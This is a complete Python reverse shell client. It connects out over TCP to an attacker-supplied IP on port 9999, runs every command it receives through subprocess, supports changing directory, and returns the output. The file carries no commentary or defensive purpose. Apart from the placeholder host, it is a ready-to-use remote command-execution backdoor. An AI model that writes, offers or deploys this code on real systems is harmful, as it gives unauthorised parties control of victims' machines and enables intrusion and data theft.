import socket
import subprocess
import os
import shlex



host = "Add your IP"
port = 9999

# CREATE SOCKET
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

print(s.recv(1024).decode())

cwd = os.getcwd()

while True:
    cmd = s.recv(1024).decode().strip()
    print(f"[+] received command: {cmd}")

    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    if cmd.startswith("cd"):
        try:
            path = cmd.split(maxsplit=1)[1]
            os.chdir(path)
            cwd = os.getcwd()
            result = cwd.encode()
        except Exception as e:
            result = str(e).encode()
    else:
        try:

            args = shlex.split(cmd)

            result = subprocess.check_output(
                args,
                stderr=subprocess.STDOUT,
                cwd=cwd
            )
        except subprocess.CalledProcessError as e:
            result = e.output
        except Exception as e:
            result = str(e).encode()

    if not result:
        result = b"[+] Executed"

    s.send(result)

s.close()
